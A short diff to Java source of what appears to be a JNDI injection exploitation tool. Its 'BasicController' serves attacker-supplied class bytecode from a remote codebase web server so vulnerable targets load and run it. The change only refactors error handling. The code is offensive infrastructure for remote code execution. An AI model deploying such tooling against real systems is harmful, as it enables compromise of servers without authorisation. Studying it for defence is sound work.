@@ -21,19 +21,13 @@ import java.util.Base64;
 @JNDIController
 @JNDIMapping("/Basic")
 public class BasicController implements Controller {
-    public Object process(byte[] byteCode) {
+    public Object process(byte[] byteCode) throws Exception {
         System.out.println("[Reference] Remote codebase: " + Config.codebase);
 
-        String className;
-
-        try {
-            ClassFile classFile = new ClassFile(new DataInputStream(new ByteArrayInputStream(byteCode)));
-            className = classFile.getName();
-        } catch (Exception e) {
-            return null;
-        }
-
+        ClassFile classFile = new ClassFile(new DataInputStream(new ByteArrayInputStream(byteCode)));
+        String className = classFile.getName();
         WebServer.getInstance().serveFile("/" + className.replace('.', '/') + ".class", byteCode);
+
         return className;
     }
 
